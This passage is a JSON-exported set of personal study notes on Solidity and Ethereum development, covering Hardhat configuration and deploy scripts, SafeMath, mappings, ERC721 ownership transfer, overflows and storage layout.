contracts","content":"\nSmart contracts are programs which govern the behaviour of accounts within the Ethereum state.\n\nIn other words they can be treated as the server-side code with different API endpoints (functions) people can hit.\n\nPractically the basis of most smart contracts is:\n\n- read functions\n- write functions\n- change the [[web3/solidity/state-variable]]s\n\n\u003e [!tip]\n\u003e\n\u003e Smart contracts are lines of code that automatically execute a function when given an input — just like a vending machine.\n\n## Immutability\n\nSmart contracts are immutable by design. Once they are deployed, they stay in their state permanently. Changing a contract requires a full redeploy. The redeploy also resets all the variables since newly deployed contract is treawted a **brand new contract**.\n\nNew contract means **new address**, and both address and [[web3/ABI]] have to be updated on the [[web3/frontend/_index]] side.\n\n\u003e [!tip] This can be solved\n\u003e\n\u003e The immutability ifself is a feature, however some parts of the contract can be deliberately programmed to be changeable (e.g. with the [[ownable contract]]).\n\u003e\n\u003e - [ ] Learn and describe how to solve it.\n\n## Deploying the smart contract\n\nDeployment of the smart contract is considered a [[web3/transaction]].\n\nWhen we deploy our contract, we tell all miners to add smart contract to the blockchain and to broadcast the contract creation transaction over the whole [[web3/blockchain]].\n\nOnce the transaction is mined, it is then broadcasted to the blockchain as a legit transaction. From there, everyone updates their copy of the blockchain.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/":{"title":"Solidity","content":"\n[Solidity](https://docs.soliditylang.org/en/v0.8.17/) is one of programming languages for developing [[web3/smart-contracts]].\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/Hardhat":{"title":"Hardhat","content":"\n[Hardhat](https://hardhat.org/docs) is a development environment for [[web3/smart-contracts]] that aids editing, compiling, debugging and deploying smart contracts and [[dApps]].\n\nIn practice it's a local development enviroment for [[web3/solidity/_index]] that spins up the [[Ethereum network]] for development and gives you fake ETH, and fake test accounts to work with the smart contract being developed. Also, it handles the `owner` address for you as well.\n\n## `hre`\n\nHRE (the _Hardhat Runtime Environment_) is an object containing all the functionality Hardhat exposes when running a task, test or script.\n\nEvery time you run a `hardhat` command the `hre` object is built on the fly using the `hardhat.config.js`.\n\n## `hardhat.config.js`\n\n```ts\nimport { HardhatUserConfig } from \"hardhat/config\";\nimport \"@nomicfoundation/hardhat-toolbox\";\nrequire(\"dotenv\").config();\n\nconst config: HardhatUserConfig = {\n  solidity: \"0.8.17\",\n  networks: {\n    goerli: {\n      url: process.env.STAGING_QUICKNODE_KEY,\n      accounts: [process.env.PRIVATE_KEY!],\n    },\n  },\n};\n\nexport default config;\n```\n\nDefines the [[web3/solidity/_index]] version to be used and [[web3/blockchain]]s to target.\n\n\u003e [!danger] Mind the compiler version\n\u003e\n\u003e The compiler version set by [[pragma]]s in `*.sol` files has to be the same as in `hardhat.config.js`.\n\nIn this case the [[web3/ethereum/goerli|Goerli network]] is defined through [[web3/QuickNode]]:\n\n- `STAGING_QUICKNODE_KEY` - an endpoint created in [[web3/QuickNode]]\n- `PRIVATE_KEY` - a **private** key of the [[web3/crypto-wallet]] used for deploying the [[web3/smart-contracts|contract]].\n  - this can be taken from [[MetaMask]]\n\n## `run.ts` and `deploy.ts`\n\nHardhat can be used to locally run the smart contract and to deploy it to an Ethereum network.\n\nTypically it's good to create 2 files in `/scripts/`:\n\n- `run.ts`\n- `deploy.ts`\n\n\u003e [!danger] Hardhat is very strict about project tree\n\n```sh\nnpx hardhat run scripts/run.ts\nnpx hardhat run scripts/deploy.ts --network goerli\n```\n\n### `run.ts`\n\n```sh\nnpx hardhat run scripts/run.ts\n```\n\nUsed for compiling the smart contract, running it, testing and debugging locally.\n\nHardhat will create a local Ethereum network, just for this contract. After the script completes it'll destroy that local network. Every time you run the contract, it'll be a fresh blockchain.\n\n```ts\n// WavePortal is the contract name\n\nconst main = async () =\u003e {\n  // get an owner and the non-owner addresses for testing\n  const [owner, randomPerson] = await hre.ethers.getSigners();\n\n  // compile the contract and generate necessary files under `/artifacts` dir\n  const waveContractFactory = await hre.ethers.getContractFactory(\"WavePortal\");\n\n  // deploy the smart contract to a local network and wait for the deployment to finish\n  const waveContract = await waveContractFactory.deploy();\n  await waveContract.deployed();\n\n  console.log(\"Contract deployed to:\", waveContract.address);\n  console.log(\"Contract deployed by:\", owner.address);\n\n  // get waves from `view` function\n  await waveContract.getTotalWaves();\n\n  // make wave transactino\n  const waveTxn = await waveContract.wave();\n\n  // wait for the transaction to be mined\n  await waveTxn.wait();\n  await waveContract.getTotalWaves();\n};\n\nconst runMain = async () =\u003e {\n  try {\n    await main();\n    process.exit(0);\n  } catch (error) {\n    console.log(error);\n    process.exit(1);\n  }\n};\n\nrunMain();\n```\n\n### `deploy.ts`\n\n```sh\nnpx hardhat run scripts/deploy.ts --network goerli\n```\n\nUsed to deploy to a real blockchain (in this case to [[web3/ethereum/goerli|Goerli Testnet]]).\n\n```ts\nconst main = async () =\u003e {\n  // get an owner address for deployment (the person who deploys)\n  const [deployer] = await hre.ethers.getSigners();\n\n  // get the owners balance\n  const accountBalance = await deployer.getBalance();\n\n  console.log(\"Deploying contracts with account: \", deployer.address);\n  console.log(\"Account balance: \", accountBalance.toString());\n\n  const waveContractFactory = await hre.ethers.getContractFactory(\"WavePortal\");\n  const waveContract = await waveContractFactory.deploy({\n    // funding the contract\n    value: hre.ethers.utils.parseEther(\"0.001\"),\n  });\n  await waveContract.deployed();\n\n  console.log(\"WavePortal address: \", waveContract.address);\n};\n\nconst runMain = async () =\u003e {\n  try {\n    await main();\n    process.exit(0);\n  } catch (error) {\n    console.log(error);\n    process.exit(1);\n  }\n};\n\nrunMain();\n```\n\n### Funding the contract\n\nDuring the deployment it's possible to _fund_ the contract so it can send money to the users who interact with it (e.g. for prizes).\n\n## `hardhat node`\n\nCreates a local [[Ethereum network]] that stays alive until killed by **CTRL + C**.\n\n## Hardhat for VS Code\n\nAn extension that adds Solidity language support and provides editor integration for Hardhat-based projects.\n\n## `console.log`\n\nSolidity doesn't have any `console.log` equivalent out-of-the-box. Hardhat fills that void with an implementation:\n\n```solidity\nimport \"hardhat/console.sol\";\n\nconstructor() {\n    console.log(\"Here I am!\");\n}\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/SafeMath":{"title":"SafeMath","content":"\n`SafeMath` is a [[web3/solidity/libraries|library]] created by [OpenZeppelin](https://www.openzeppelin.com/) to make sure math operations won't cause the [[web3/solidity/overflows]].\n\n## Example\n\n`SafeMath` attaches 4 functions — `add`, `sub`, `mul`, and `div` to native data types. We can access them from `uint256` as follows:\n\n```\nusing SafeMath for uint256;\n\nuint256 a = 5;\nuint256 b = a.add(3); // 5 + 3 = 8\nuint256 c = a.mul(2); // 5 * 2 = 10\n```\n\n\u003e [!tip]\n\u003e\n\u003e It's a good idea in general to just use SafeMath instead of the basic math operations. Maybe in a future version of Solidity these will be implemented by default, but for now we have to take extra security precautions in our code.\n\n\u003e [!danger]\n\u003e\n\u003e `SafeMath` library is designed for `uint256` type. For `uint16`/`32` you need to implement the library yourself or use an existing implementation (?)\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/address":{"title":"address function","content":"\n- [ ] Description\n\n- `address(this).balance` is the balance of the contract itself.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/approve":{"title":"approve fn","content":"\nThe `approve` function is used to _enable_ the user to _approve_ the transfer (once the owner allows for that transfer first).\n\n```solidity\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n\nfunction approve(address _approved, uint256 _tokenId) external payable;`\n```\n\nThe token's **owner** first calls `approve` with the address he wants to transfer to, and the `_tokenID` . The contract then stores who is approved to take a token, usually in a [[web3/solidity/mapping]] `(uint256 =\u003e address)`.\n\nThen, when the owner or the approved address calls `transferFrom`, the contract checks if that `msg.sender` is the owner or is approved by the owner to take the token, and if so it transfers the token to him.\n\nIn the [[web3/solidity/transferFrom]] only case the sender of the token calls the `transferFrom` function; in this case the owner or the approved receiver of the token calls it.\n\n\u003e [!question] Best way for [[airdropping]]?\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/assert":{"title":"assert fn","content":"\n`assert` is similar to [[web3/solidity/require]]. The difference between `assert` and `require` is that `require` will refund the user the rest of their gas when a function fails, **whereas `assert` will not**.\n\nMost of the time you want to use `require` in your code; `assert` is typically used when something has gone horribly wrong with the code (like the [[web3/solidity/overflows]]).\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/balanceOf":{"title":"balanceOf function","content":"\nIn [[web3/solidity/_index]], the `balanceOf` function simply takes an `address`, and returns how many tokens that `address` owns.\n\n```solidity\n  function balanceOf(address _owner) external view returns (uint256 _balance);\n```\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/comments":{"title":"Comments","content":"\nThe standard in the [[web3/solidity/_index]] community is to use a format called [natspec](https://docs.soliditylang.org/en/v0.8.16/natspec-format.html), which looks like this:\n\n```solidity\n/// @title A contract for basic math operations\n/// @author H4XF13LD MORRIS 💯💯😎💯💯\n/// @notice For now, this contract just adds a multiply function\ncontract Math {\n  /// @notice Multiplies 2 numbers together\n  /// @param x the first uint.\n  /// @param y the second uint.\n  /// @return z the product of (x * y)\n  /// @dev This function does not currently check for overflows\n  function multiply(uint x, uint y) returns (uint z) {\n    // This is just a normal comment, and won't get picked up by natspec\n    z = x * y;\n  }\n}\n```\n\n`@notice` explains to a **user** what the contract / function does. `@dev` is for explaining extra details to developers. At the very least, leave a `@dev` note explaining what each function does.\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/dApps":{"title":"dApp","content":"\n_decentralised App_ is an application that can work autonomously, usually through [[web3/smart-contracts]] that lives on [[web3/blockchain]].\n\nContrary to the traditional, centralised apps a dApp can work without human's intervention and is not a proprierty of anyone. The ownership of a dApp is based on and represented by [[web3/ethereum/tokens]].\n","lastmodified":"2023-01-10T20:59:18.213284403Z","tags":null},"/web3/solidity/erc721-ownership-transfer":{"title":"Ownership transfer in ERC721","content":"\nHere's an example of ownership transfer of the [[web3/ethereum/ERC721]] token (from [CryptoZombies](https://cryptozombies.io/)):\n\n```solidity\ncontract ZombieOwnership is ZombieAttack, ERC721 {\n\n  mapping (uint =\u003e address) zombieApprovals;\n\n  function balanceOf(address _owner) external view returns (uint256) {\n    return ownerZombieCount[_owner];\n  }\n\n  function ownerOf(uint256 _tokenId) external view returns (address) {\n    return zombieToOwner[_tokenId];\n  }\n\n  function _transfer(address _from, address _to, uint256 _tokenId) private {\n    ownerZombieCount[_to]++;\n    ownerZombieCount[_from]--;\n    zombieToOwner[_tokenId] = _to;\n    emit Transfer(_from, _to, _tokenId);\n  }\n\n  function transferFrom(address _from, address _to, uint256 _tokenId) external payable {\n    require (zombieToOwner[_tokenId] == msg.sender || zombieApprovals[_tokenId] == msg.sender);\n    _transfer(_from, _to, _tokenId);\n  }\n\n  function approve(address _approved, uint256 _tokenId) external payable onlyOwnerOf(_tokenId) {\n    zombieApprovals[_tokenId] = _approved;\n\n    emit Approval(msg.sender, _approved, _tokenId);\n  }\n}\n```\n\nIn [[web3/solidity/approve]], we want to make sure only the owner of the token can give someone approval to take it. So we need to add the `onlyOwnerOf` modifier to `approve` (`onlyOwnerOf` is a custom [[web3/solidity/modifiers|modifier]]). Then we need to set `zombieApprovals` [[web3/solidity/mapping]] for `_tokenId` equal to the `_approved` address. Ultimately, the `Approval` event needs to be fired to comply with [[web3/ethereum/ERC721]] standard.\n\nIt also would be helpful to do:\n\n- extra checks to prevent [[web3/ethereum/burning-tokens]]\n- prevent [[web3/solidity/overflows]] and underflows\n- prevent the year 2038 problem (xd but why not)\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/ether":{"title":"ether keyword","content":"\nIn [[web3/solidity/_index]] the `ether` keyword is used to represent monetary amounts (`1 ether` is equal to 1 ETH).\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/event":{"title":"event","content":"\nOn a basic level, an `event` in [[web3/solidity/_index]] is a message the [[web3/smart-contracts]] throw out that can be captured in a client **in real time**.\n\n## Example\n\n```solidity\n// defining an event\nevent NewWave(address indexed from, uint256 timestamp, string message);\n\n// calling an event\nemit NewWave(msg.sender, block.timestamp, _message);\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/function":{"title":"function","content":"\nIn [[web3/solidity/_index]], function execution always needs to start with an external caller. A [[web3/smart-contracts|smart-contract]] will just sit on the blockchain doing nothing until someone calls one of its functions. So there will always be a [[web3/solidity/msg.sender|msg.sender]].\n\n- [[web3/solidity/address]]\n- [[web3/solidity/require]]\n- [[web3/solidity/assert]]\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/inheritance":{"title":"inheritance","content":"\nIn [[web3/solidity/_index]], to inherit from a contract, use `is` keyword:\n\n```solidity\nimport \"./zombieattack.sol\";\n\ncontract ZombieOwnership is ZombieAttack {\n\n}\n```\n\nIt's possible to inherit from multiple contracts as follows:\n\n```solidity\nimport \"./zombieattack.sol\";\nimport \"./zombieforces.sol\";\n\ncontract ZombieOwnership is ZombieAttack, ZombieForces {\n\n}\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/libraries":{"title":"Libraries","content":"\nIn web3 ecosystem in general, libraries take form of the special types of [[web3/smart-contracts]] in [[web3/solidity/_index]].\n\n- [[SafeMath]]\n\n## SafeMath library declaration example\n\n```solidity\nlibrary SafeMath {\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    assert(c \u003e= a);\n    return c;\n  }\n\n    // ...sub, mul, div funcions\n}\n```\n\nWe create a library with `library` keyword.\n\nLibraries allow us to use the `using` keyword, which automatically tacks on all of the library's methods to another data type:\n\n```solidity\nusing SafeMath for uint;\n\n// now we can use these methods on any uint\nuint test = 2;\ntest = test.mul(3); // test now equals 6\ntest = test.add(5); // test now equals 11\n```\n\nWhen we declare `using SafeMath for uint`, the `uint` we call the function on (`test`) is automatically passed in as the first argument.\n\nBasically `add` just adds 2 `uint`s like `+`, but it also contains an [[web3/solidity/assert]] to make sure the sum is greater than `a`. This protects us from [[web3/solidity/overflows]].\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/mapping":{"title":"mapping","content":"\n_Mapping_ is one of ways of storing organized data in [[web3/solidity/_index]].\n\nIt's essentially a key-value store for storing and looking up data.\n\nMappings act as hash tables consiting of key-value pairs.\n\n```solidity\nmapping(_KeyType =\u003e _ValueType) public mappingName\n```\n\nMappings are frequently used to associate unique [[Ethereum network]] address with value types, e.g. a user's address to theirr corresponding level in a game:\n\n```solidity\nmapping(address =\u003e uint) public userLevel;\n```\n\nWe can only use mappings for [[web3/solidity/state-variable]]s.\n\n## Accessing value types from a mapping with key types\n\nTo identify user's level in a game we can create a function taking an address as a parameter:\n\n```solidity\nfunction currentLevel(address addr) public constant returns (uint) {\n    return userLevel[addr];\n}\n```\n\nA mapping can store many `_KeyTypes` to `_ValueTypes`. Eg. many users playing the games all at once and they can have their own corresponding `userLevel`.\n\n## Default value\n\nMappings **don't have length** by design. They also don't have a concept of a key or value being set.\n\nWhen mappings are initialized every possible key exists in the mappings and are mapped to _values whose byte-representations are all zeros_.\n\nIn details it goes like this:\n\nWhen `userLevel` is initialized it’s done in such a way that every possible Ethereum address exists in the mapping and is mapped to a corresponding level of 0.\n\nIt doesn't matter whether it’s a random Ethereum user’s MetaMask address who perhaps has never even heard of the game before, or maybe an arbitrary smart contract on the Ethereum blockchain doing something totally unrelated. Our mapping still maps them to a _value whose byte-representation are all zeros_.\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/modifiers":{"title":"modifiers","content":"\n- [[web3/solidity/payable]]\n- [[web3/solidity/view]]\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/msg.sender":{"title":"msg.sender","content":"\nIn [[web3/solidity/_index]] `msg.sender` is the wallet address of the person who called the function.\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/overflows":{"title":"Overflows \u0026 Underflows","content":"\nLet's say we have a `uint8`, which can only have 8 bits. That means the largest number we can store is binary `11111111` (or in decimal, 2^8 - 1 = 255).\n\nIf we'd call:\n\n```\nuint8 number = 255;\nnumber++;\n```\n\nWe've cause an _overflow_ — so `number` is counterintuitively now equal to `0` even though we increased it. (If you add 1 to binary `11111111`, it resets back to `00000000`).\n\nAn _underflow_ is similar, where if you subtract `1` from a `uint8` that equals `0`, it will now equal `255` (because `uint`s are unsigned, and cannot be negative).\n\nIt seems unlikely that a `uint256` would overflow as 2^256 is a really big number, but it's still good to put protections in our contract so that our [[dApps]] are safe from unexpected behaviour.\n\nTo prevent overflows and underflows, we can use [[web3/solidity/SafeMath]] library.\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/ownerOf":{"title":"ownerOf","content":"\nIn [[web3/solidity/_index]], the `ownerOf` function takes a token ID, and returns the `address` of the person who owns it.\n\n```solidity\nfunction ownerOf(uint256 _tokenId) external view returns (address _owner);\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/payable":{"title":"payable modifier","content":"\n`payable` denotes a function that can fund the [[web3/smart-contracts|contract]] and payout money from it to the users interacting with it.\n\n```solidity\nconstructor() payable {\n  console.log(\"We have been constructed!\");\n}\n```\n\nMissing the `payable` will cause `Non-payable constructor cannot override value` error.\n\n## References\n\n- [[web3/solidity/Hardhat#`console.log`|console.log]]\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/pragma":{"title":"pragma","content":"\n```solidity\npragma solidity ^0.8.17;\n```\n\nStates the [[web3/solidity/_index]] version that should be used to compile the [[web3/smart-contracts|smart contract]] in [[Ethereum]] network.\n\ndominika_sz — 10.10.2022\nwygooglaj, fajna historia łączy sie z tym GM. Nawet groźba śmierci!\nGM!\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/require":{"title":"require function","content":"\n`require` [[web3/solidity/function]] checks if the condition passed as an argument is `true`.\n\nIf it's not, the function will quit and the [[web3/transaction]] will cancel.\n\n## Example\n\n```solidity\nrequire(\n    prizeAmount \u003c= address(this).balance, // condition\n    \"Trying to withdraw more money than the contract has.\" // error message\n);\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/state-variable":{"title":"State Variable","content":"\nIn [[web3/solidity/_index]] a _state variable_ is the one that is stored permanently in contract storage.\n\nState variables are declared outside of the scope of the function.\n\nChanging the state variable is considered a [[web3/transaction]].\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/struct-packing":{"title":"struct packing","content":"\nNormally there's no benefit to using different sub-types of `uint`s (`uint8`, `uint16`, `uint32`, etc.) because [[web3/solidity/_index]] reserves 256 bits of storage regardless of the `uint` size. For example, using `uint8` instead of `uint` (`uint256`) won't save you any gas.\n\nBut there's an exception to this: inside `struct`s.\n\nIf you have multiple `uint`s inside a struct, using a smaller-sized `uint` when possible will allow Solidity to pack these variables together to take up less storage.\n\n## Example\n\n```solidity\nstruct NormalStruct {\n  uint a;\n  uint b;\n  uint c;\n}\n\nstruct MiniMe {\n  uint32 a;\n  uint32 b;\n  uint c;\n}\n\n// `mini` will cost less gas than `normal` because of struct packing\nNormalStruct normal = NormalStruct(10, 20, 30);\nMiniMe mini = MiniMe(10, 20, 30);\n```\n\nFor this reason, inside a struct you'll want to use the smallest integer sub-types that will suffice for the struct.\n\n### Clustering\n\nYou'll also want to cluster identical data types together (i.e. put them next to each other in the struct) so that Solidity can minimize the required storage space. For example, a struct with fields `uint c; uint32 a; uint32 b;` will cost less gas than a struct with fields `uint32 a; uint c; uint32 b;` because the `uint32` fields are clustered together.\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/transferFrom":{"title":"transferFrom function","content":"\n```solidity\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n```\n\nThe token's **owner** calls `transferFrom` with his `address` as the `_from` parameter, the `address` he wants to transfer to as the `_to` parameter, and the `_tokenId` of the token he wants to transfer.\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/variables":{"title":"variable types","content":"\nIn [[web3/solidity/_index]], there are two locations you can store variables — in `storage` and in `memory`.\n\n`storage` variables are stored permanently on the [[blockchain]]. `memory` variables are temporary, and disappear when the function call ends.\n\nMost of the time Solidity will handle them by default. [[web3/solidity/state-variable]]s are by default `storage`. Variables declared inside functions are `memory`.\n\nHowever, variables have to be declared as `storage` or `memory` when dealing with [[web3/solidity/struct-packing|struct]]s and [[array]]s within functions.\n\n```solidity\ncontract SandwichFactory {\n  struct Sandwich {\n    string name;\n    string status;\n  }\n\n  Sandwich[] sandwiches;\n\n  function eatSandwich(uint _index) public {\n    // You should declare with the `storage` keyword, like:\n    Sandwich storage mySandwich = sandwiches[_index];\n\n    // ...in which case `mySandwich` is a pointer to `sandwiches[_index]`\n    // in storage, and...\n\n    mySandwich.status = \"Eaten!\";\n    // ...this will permanently change `sandwiches[_index]` on the blockchain.\n\n    // If you just want a copy, you can use `memory`:\n    Sandwich memory anotherSandwich = sandwiches[_index + 1];\n    // ...in which case `anotherSandwich` will simply be a copy of the\n    // data in memory, and...\n    anotherSandwich.status = \"Eaten!\";\n    // ...will just modify the temporary variable and have no effect\n    // on `sandwiches[_index + 1]`. But you can do this:\n    sandwiches[_index + 1] = anotherSandwich;\n    // ...if you want to copy the changes back into blockchain storage.\n  }\n}\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/solidity/view":{"title":"view function modifier","content":"\nA `view` function modifier in [[web3/solidity/_index]] denotes a function used for _reading_ data from the [[web3/smart-contracts|smart contract]].\n\nWhen we read data from the smart contract, no [[web3/transaction]] is made and the [[web3/ethereum/gas-fee]] is not applied, since we're not making any changes to the [[web3/blockchain]].\n\n```solidity\nfunction getAllWaves() public view returns (Wave[] memory) {\n    return waves;\n}\n```\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null},"/web3/transaction":{"title":"transaction","content":"\nEvery function that is called on the blockchain is considered a _transaction_ which means the [[web3/ethereum/gas-fee]] is applicable (unless the function is a [[view]]).\n\nDeploying a [[web3/smart-contracts|smart contract]] is a transaction as well.\n\n## Mining the transactions\n\nTransactions are [[mined]] by the [[miners]]:\n\n1. We broadcast our transaction\n2. Wait for it to be picked up by actual miners\n3. Wait for it to be mined\n4. Wait for it to be broadcasted back to the blockchain telling all the other miners to update their copies\n","lastmodified":"2023-01-10T20:59:18.217284475Z","tags":null}}